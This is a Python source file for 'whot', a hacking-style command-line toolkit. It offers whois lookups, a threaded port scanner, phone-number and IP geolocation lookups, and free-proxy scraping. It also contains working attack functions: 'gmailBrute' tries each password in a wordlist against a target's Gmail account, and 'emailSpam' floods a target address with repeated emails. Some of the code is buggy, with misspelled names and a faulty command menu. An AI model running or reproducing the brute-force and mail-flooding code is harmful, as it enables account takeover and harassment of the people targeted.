#!/usr/bin/env python3
# Copyright (C) 2019 t1ra and Molarbuffalo find us on github
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

        # PACKAGES #
try:
    import art, phonenumbers, phonenumbers.phonenumberutil, socket, queue, itertools
    import re, whois, requests, tqdm, colored, sys, os, shutil, urllib.request, time
    import json, threading, readline
    from ip2geotools.databases.noncommercial import DbIpCity
    import phonenumbers.geocoder as geocoder
    import phonenumbers.timezone as timezone
    import phonenumbers.carrier as carrier
    from colored import stylize
    import smtplib, ssl
    from itertools import cycle
    import traceback
    from lxml.html import fromstring

except ImportError:
    print("ImportError, you're probably missing some libraries or using"
        + " Python 2. try ```sudo python3 -m pip install python-whois art"
        + " tqdm phonenumbers colored socksipy-branch requests ip2geotools")
    exit()
# External packages required:
# python-whois
# art
# phonenumbers
# tqdm
# colored
# socksipy-branch
# requests
# ip2geotools

    # URL/IP REGEX #
url_regex = re.compile(
        r'^((?:http)s?://)?' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

ip_regex = re.compile(
        r'^((?:http)s?:\/\/)?'
        r'((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    # CUSTOM PRINT FUNCTION #
error = "error"
warning = "warning"
success = "success"
notice = "notice"

def cprint(type, string):
    if type == "error":
        print("[!] " + stylize(string, colored.fg("red") + colored
            .attr("bold")))
    elif type == "warning":
        print("[*] " + stylize(string, colored.fg("red")))
    elif type == "success":
        print("[+] " + stylize(string, colored.fg("green")))
    elif type == "notice":
        print("[*] " + stylize(string, colored.fg("light_cyan")))

    # PROGRAM INTRO #
PROG_NAME = "whot"
# Legal notice?
print(stylize(f"""
By using {PROG_NAME} you agree that you will not:
(i) Use {PROG_NAME} in an illegal or malicious manner, and;
(ii) Use any component of {PROG_NAME} to facilitate the use of malicious software.
If you do not agree to the terms of use, you may not use the application.
""", colored.fg("red") + colored.attr("bold")))
print(stylize(art.text2art(PROG_NAME), colored.fg("green")))
cprint(notice, "\033[F\033[F'help' for help.")
# "\033[F" in supported terminal emulators moves the cursor up one line. It
# just makes it look a little neater.

    # WHOIS INFORMATION #
whois_list = [
    "Emails",
    "Org",
    "Address",
    "State",
    "Zipcode",
    "Country",
    "Name Servers"
]

    # PORT SCANNER INFORMATION #
common_ports = {
    1: "TCPMUX [TCP, UDP]",
    5: "Remote Job Entry [TCP, UDP]",
    7: "Echo Protocol [TCP, UDP]",
    9: "Discard Protocol [TCP, SCTP, UDP]/Wake-on-Lan [UDP]",
    11: "Active Users (Systat) [TCP, UDP]",
    18: "Message Send Protcol [TCP, UDP]",
    20: "File Transfer Protocol (Data Transfer) [TCP, SCTP, UDP]",
    21: "File Transfer Protocol (Control) [TCP, SCTP, UDP]",
    22: "Secure Shell [TCP, SCTP, UDP]",
    23: "Telnet Protocol [TCP, UDP]",
    25: "Simple Mail Transfer Protocol [TCP, UDP]",
    37: "Time Protocol [TCP, UDP]",
    38: "Route Access Protocol [TCP, UDP]",
    39: "Resource Location Protocol [TCP, UDP]",
    42: "Host Name Server Protocol [TCP, UDP]",
    43: "WHOIS Protocol [TCP, UDP]",
    49: "Terminal Access Controller Access-Control System/Terminal Access Controller Access-Control System+ [TCP, UDP]",
    50: "Remote Mail Checking Protocol [TCP, UDP]",
    53: "Domain Name System [TCP, UDP]",
    54: "Xerox Network Systems Clearinghouse Name Server [TCP, UDP]",
    56: "Xerox Network Systems Authentication Protocol [TCP, UDP]",
    58: "Xerox Network Systems Mail [TCP, UDP]",
    67: "Bootstrap Protocol Server/Dynamic Host Configuration Protocol [TCP, UDP]",
    68: "Bootstrap Protocol Client/Dynamic Host Configuration Protocol [TCP, UDP]",
    69: "Trivial File Transfer Protocol [TCP, UDP]",
    70: "Gopher Protocol [TCP, UDP]",
    71: "NETRJS Protocol [TCP, UDP]",
    72: "NETRJS Protocol [TCP, UDP]",
    73: "NETRJS Protocol [TCP, UDP]",
    74: "NETRJS Protocol [TCP, UDP]",
    79: "Finger Protocol [TCP, UDP]",
    80: "Hypertext Transfer Protocol [TCP, SCTP, UDP]/Quick UDP Internet Connections [UDP]",
    81: "TorPark Onion Routing [TCP, UDP]",
    82: "TorPark Control [TCP, UDP]",
    88: "Kerberos Authentication System [TCP, UDP]",
    101: "NIC Host Name [TCP, UDP]",
    102: "ISO Transport Service Access Point [TCP, UDP]",
    105: "CCSO Nameserver [TCP, UDP]",
    107: "Remote User Telnet Service [TCP, UDP]",
    109: "Post Office Protocol Version 2 [TCP, UDP]",
    110: "Post Office Protocol Version 3 [TCP, UDP]",
    113: "Ident [TCP]/Authentication Service [TCP, UDP]",
    115: "Simple File Transfer Protocol [TCP, UDP]",
    117: "Unix-to-Unix Copy Mapping Project [TCP, UDP]",
    118: "Structured Query Language Services [TCP, UDP]",
    135: "Microsoft End Point Mapper [TCP, UDP]",
    139: "NetBIOS Session Service [TCP, UDP]",
    143: "Internet Message Access Protocol [TCP, UDP]",
    152: "Background File Tranfer Protocol [TCP, UDP]",
    153: "Simple Gateway Monitoring Protocol [TCP, UDP]",
    156: "Structured Query Language Services [TCP, UDP]",
    161: "Simple Network Management Protocol [TCP, UDP]",
    162: "Simple Network Mangement Protocol Trap [TCP, UDP]",
    170: "Network PostScript Print Server [TCP, UDP]",
    177: "X Display Manager Control Protocol [TCP, UDP]",
    179: "Border Gateway Protocol [TCP, UDP]",
    194: "Internet Relay Chat [TCP, UDP]",
    199: "Simple Network Management Protocol Multiplexing Protocol [TCP, UDP]",
    201: "AppleTalk Routing Maintenance [TCP, UDP]",
    209: "Quick Mail Transfer Protocol [TCP, UDP]",
    210: "ANSI Z39.50 [TCP, UDP]",
    218: "Message Posting Protocol [TCP,  UDP]",
    220: "Internet Message Access Protocol [TCP, UDP]",
    300: "ThinLinc Web Access [TCP]",
    308: "Novastor Online Backup [TCP]",
    311: "Mac OS X Server Admin/AppleShare IP Web Administration [TCP, UDP]",
    366: "On-Demand Mail Relay [TCP, UDP]",
    370: "CodaAuth2/SecureCast1 [TCP, UDP]",
    383: "HP Data Alarm Manager [TCP, UDP]",
    389: "Lightweight Directory Access Protocol [TCP, UDP]",
    401: "Uninterruptable Power Supplies [TCP, UDP]",
    443: "Hypertext Transfer Protocol over TLS/SSL [TCP, SCTP, UDP]/Quick UDP Internet Connections [UDP]",
    444: "Simple Network Paging Protocol [TCP, UDP]",
    445: "Microsoft Directory Services Active Directory (Windows Shares)/Server Message Block (File Sharing) [TCP, UDP]",
    464: "Kerberos Change/Set Password [TCP, UDP]",
    465: "URL Rendezvous Directory for SSM/Authenticated Simple Mail Transfer Protocol over TLS/SSL [TCP, UDP]",
    497: "Retrospect [TCP, UDP]",
    500: "Internet Security Association and Key Management Protocol/Internet Key Exchange [TCP, UDP]",
    504: "Citadel [TCP, UDP]",
    510: "FirstClass Protocol [TCP, UDP]",
    512: "Remote Process Execution (Berkeley R-Commands)",
    513: "Remote Process Execution (Berkeley R-Commands)",
    514: "Remote Shell [TCP]/Syslog [UDP]",
    540: "Unix-to-Unix Copy Protocol [TCP]",
    544: "Kerberos Remote Shell [TCP]",
    636: "Lightweight Directory Access Protocol over TLS/SSL [TCP, UDP]",
    655: "Tinc VPN Daemon [TCP, UDP]",
    657: "IBM Remote Monitoring and Control [TCP, UDP]",
    666: "DOOM Online [TCP, UDP], airserv-ng [TCP]",
    range(60000, 61000): "Commonly used by Mosh for servers and clients [TCP on Port 22, UDP]", # til you can use range() in dictionaries
    64738: "Mumble [TCP, UDP]"
}

    # MENU VARIABLES #
menu_pointer = "> " + stylize("$ ", colored.fg("green"))
action_pointer = "> " + stylize("$ ", colored.fg("blue"))
one_word_commands = ["help", "?", "dork"]

    #  MENU #
def menu():
    while True:
        prompt = input(menu_pointer).lower().lstrip()
        if re.match("[a-zA-Z]", prompt) and prompt not in one_word_commands:
            try:

                prompt.split(" ")[1]
            except IndexError:
                pass
        if prompt == "help" or prompt == "?":
            help()
        elif prompt[0] == "+":
            phonenumber_lookup(prompt)
        elif "port-scan" in prompt.lower() and re.match(url_regex, (prompt.split("scan ")[1]).split(":")[0]):
            port_scan(prompt.split("scan ")[1])
        elif "whois" in prompt.lower() and re.match(url_regex, prompt.split("whois ")[1]):
            who_is(prompt.split("whois ")[1])
        elif "resolve" in prompt.lower() and re.match(url_regex, prompt.split("resolve ")[1].split(":")[0]):
            resolve(prompt.split("resolve ")[1])
        elif prompt == "clear" or prompt == "cls":
            clear()
        elif prompt == "emailspam":
            emailSpam()
        elif "geo" in prompt.lower() and re.match(url_regex, prompt.split("geo ")[1].split(":")[0]):
            geo(prompt.split("geo ")[1])
        elif "gmailbrute" in prompt.lower():
            gmailBrute()
        if "scrape" in prompt and str.isdigit(prompt.split("scrape ")[1]):
            proxyScrape(int(prompt.split("scrape ")[1]))
        else:
            cprint(error, "Invalid or malformed command.")

    # CLEAR SCREEN #
def clear():
    os.system('cls||clear') # This is janky but works.

    # HELP #
def help():
    l_pn = len(PROG_NAME)
    print(f"{PROG_NAME} commands:")
    cprint(notice, " "*l_pn + "<international phone number>: find"
        + " information about a phone number.")
    cprint(notice, " "*l_pn + "whois <ip address or url>: gather"
        + " whois information.")
    cprint(notice, " "*l_pn + "port-scan <ip address or url><optional port (range)>:"
      + " scan a range of ports and locate open ones.")
    cprint(notice, " "*l_pn + "resolve <website>:"
      + " will resolve the inputted website.")
    cprint(notice, " "*l_pn + "geo <ip or website URL>:"
      + " will attempt to find location of the ip / website")
    cprint(notice, " "*l_pn + "<emailspam>"
      + " this will brute a targeted email."
      + " this will send a email of your choice to another user, requires a Gmail Account.")
    cprint(notice, " "*l_pn + "gmailbrute")
    cprint(notice, " "*l_pn + "<clear>:"
      + " to clear the screen.")

    # WORKING ANIMATION #
def working():
    for i in itertools.cycle(["|", "/", "-", "\\"]):
        if scan_finished:
            break
        sys.stdout.write("\r" + "[" + i + "]")
        sys.stdout.flush()
        time.sleep(0.1)

    # WHOIS #
def who_is(address):
    cprint(success, "Scanning For Info...")
    # Print whois information
    try:
        whois_data = str(whois.whois(address))
    except whois.parser.PywhoisError:
        cprint(error, "Invalid or malformed URL.")
        return
    data = json.loads(whois_data)

    try:
        if len(list(data['updated_date'])) > 1:
            cprint(success, f"Whois for {address}, updated {data['updated_date'][0]}")
        else:
            cprint(success, f"Whois for {address}, updated {data['updated_date']}")
    except TypeError:
        cprint(error, "Invalid or malformed URL.")
        return
    except KeyError:
        cprint(error, f"Data can't be retrieved about {address}, it probably"
            + "redirects to somewhere.")
    if len(list(data['creation_date'][0])) > 0:
        cprint(success, f"Created: {data['creation_date'][0]}")
    else:
        cprint(success, f"Created: {data['creation_date']}")
    cprint(success, f"Registrar: {data['registrar']}")
    for item_position, item in enumerate(whois_list):
        item = data[item.lower().replace(" ", "_")]
        if item is not None:
            if isinstance(item, list):
                for subitem in range(len(item)):
                    item[subitem] = item[subitem].lower()
                item = set(item)
                item = re.sub(r"[\[\]'{}]+", "", str(item))
            cprint(success, f"{whois_list[item_position]}: {item}")

    # PORT SCANNER #
def port_scan(address):
    global open_ports
    cprint(warning, "Scanning a port range over 1000 is substantially slower.")
    cprint(notice, "Timeout is 500ms.")
    if ":" in address:
        port_range = address.split(":")[1]
        address = address.split(":")[0]
    else:
        port_range = input("Port range?  (hypen-seperated, empty for auto, or a"
            + " single port)\n" + action_pointer).replace(" ", "")
    if not re.match("[0-9]-?", port_range):
        cprint(error, "Invalid or malformed port range.")
        return
    if port_range == "":
        range_low, range_high = 1, 65535
    elif "-" in port_range:
        range_low, range_high = int(port_range.split("-")[0]), int(port_range.split("-")[1])
        if range_low > range_high or range_low < 1 or range_high > 65535:
            cprint(error, "Invalid or malformed port range.")
            return
    elif int(port_range) > 0 and int(port_range) < 65535:
        range_low, range_high = int(port_range), int(port_range)
    else:
        cprint(error, "Invalid or malformed port range.")
        return
    ports = []
    for port in range(range_low, range_high):
        ports.append(port)
    try:
        address_ip = socket.gethostbyname(address)
    except socket.gaierror:
        cprint(error, "Invalid or malformed URL.")
        return
    print(f"Port information for {address} ({address_ip})")
    waiting = threading.Thread(target=working)
    threads, open_ports = [], []
    if range_high - range_low < 1000 and range_low is not range_high:
        global scan_finished
        scan_finished = False
        waiting.start()
        for port in range(range_low, range_high):
            thread = threading.Thread(target=port_scan_thread, args=(address_ip, port))
            threads.append(thread)
        for t in threads:
            t.start()
    elif range_low is range_high:
        scan_finished = True
        port_scan_thread(address_ip, range_low)
    else:
        for port in range(range_low, range_high):
            port_scan_thread(address_ip, port)
    for t in threads:
        t.join()
    scan_finished = True
    if str(open_ports) == "[]":
        open_ports = None
    else:
        for port_index, port in enumerate(open_ports):
            try:
                open_ports[port_index] = str(port) + f" ({common_ports[port]})"
            except KeyError:
                pass
    if open_ports is None:
        print("\rNo open ports.")
    else:
        print("\rResult:")
        for port in open_ports:
            print(port)
    if ("http://" not in address or "https://" not in address) and not re.match(ip_regex, address):
        address = "http://" + address
    response_time = requests.get(address).elapsed.total_seconds()
    cprint(notice, "Response time was"
        + f" {response_time}s ({round(float(response_time)*1000)}ms)")

def port_scan_thread(address_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(0.5)
    try:
        sock.connect((address_ip, port))
        open_ports.append(port)
    except (socket.timeout, ConnectionRefusedError):
        pass

    # PHONE NUMBER LOOKUP #
def phonenumber_lookup(ph):
    try:
        number = phonenumbers.parse(ph)
        phonenumbers.is_possible_number(number)
        print("Country: " + geocoder.region_code_for_number(number))
        if geocoder.description_for_number(number, "en").lstrip() != "":
            print("City: " + geocoder.description_for_number(number, "en"))
        print("Timezone: " + re.sub("[()'',]", "",
                str(timezone.time_zones_for_number(number))))
        print("Carrier: " + carrier.name_for_number(number, "en"))
    except phonenumbers.phonenumberutil.NumberParseException:
        cprint(error, "Invalid or malformed number.")
        return

    # IP RESOLVING #
def resolve(address):
    try:
        targetedIP = socket.gethostbyname(address)
    except sock.gaierror:
        cpirnt(error, "Invalid or malformed URL.")
        return
    cprint(success, f"{address} resolved to: {targetedIP}")

    # GEOLOCATION #
def geo(address):
    global scan_finished
    scan_finished = False
    thread = threading.Thread(target=working).start()
    geoIP = socket.gethostbyname(address)
    response = DbIpCity.get(geoIP, api_key='free')
    city = response.city
    country = response.country
    region = response.region
    scan_finished = True
    print("\r", end="")
    cprint(success, f"{geoIP} is from {country} and is in {region} and is located in {city}")


    # EMAIL SPAM
def emailSpam():
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)

    username = input("\033[31mPlease enter your email:\033[37m ")
    password = input("\033[31mPlease enter your password:\033[37m ")

    SUBJECT = input("\033[31mPlease enter the subject of the email:\033[37m ")

    Message = input("\033[31mPlease input your message:\033[37m ")

    target = input("\033[31mPlease enter the targets email:\033[37m  ")

    counter = int(input("\033[31mNumber Of Emails:\033[37m "))


    EmailForm = '\r\n'.join(['To: %s' % target,
                    'From: %s' % username,
                    'Subject: %s' % SUBJECT,
                    '', Message])
    for i in range(counter):
        try:
            server.login(username, password)
            server.sendmail(username, target, EmailForm)
            cprint (success, f"{i} email sent")
            i += 1

        except:
            cprint(error, "\033Invalid Username or Password, or Server Issues")
            cprint(error, "Or Account Settings wrong, you must update your")
            cprint(error, "Settings via https://myaccount.google.com/security")
            cprint(error, "You must change 'less secure app access' to on")
            cprint(error, "To enable you to use this function!")
            server.quit()

def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies


def gmailBrute():


    server = smtplib.SMTP_SSL('smtp.gmail.com')
    targetEmail = input("\033[94mTarget: ")
    passWordList = input("\033[93mPassword List: ")
    pass_file = open(passWordList, 'r')

    proxies = get_proxies()
    proxy_pool = cycle(proxies)
    url = 'https://httpbin.org/ip'


    for password in pass_file:

            try:
                proxy = next(proxy_pool)

                server.login(targetEmail, password)

                cprint(success, f"Proxie: {proxy}")
                cprint(success, f"Password Found: {password}")
                break;
            except smtplib.SMTPAuthenticationError:
                cprint(error, f"Proxie: {proxy}")
                cprint(error, f"Password Incorrect: {password}")

def proxyScrape(number):
    proxies = get_proxies()
    proxy_pool = cycle(proxies)
    url = 'https://httpbin.org/ip'

    for i in range(1, number):
        try:
            proxy = next(proxy_pool)

            cprint(success, f"HTTP Proxies: {proxy}")
        except:
            cprint(error, "A  Error Occured")

# Lets roll :sunglasses:
try:
    menu()
except KeyboardInterrupt:
    print("\n[*] " + stylize("Exiting.", colored.fg("light_cyan")))
    exit()
